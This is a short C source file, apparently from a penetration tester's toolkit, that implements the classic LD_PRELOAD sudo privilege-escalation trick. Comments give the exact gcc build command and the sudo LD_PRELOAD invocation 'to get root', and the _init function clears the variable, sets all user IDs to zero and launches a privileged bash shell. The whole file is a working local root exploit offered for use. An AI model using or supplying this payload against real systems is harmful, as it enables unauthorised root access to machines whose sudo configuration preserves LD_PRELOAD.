#include <sys/types.h>
#include <stdlib.h>
// gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
// sudo LD_PRELOAD=/tmp/preload.so program-name-here to get root
void _init() { 
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}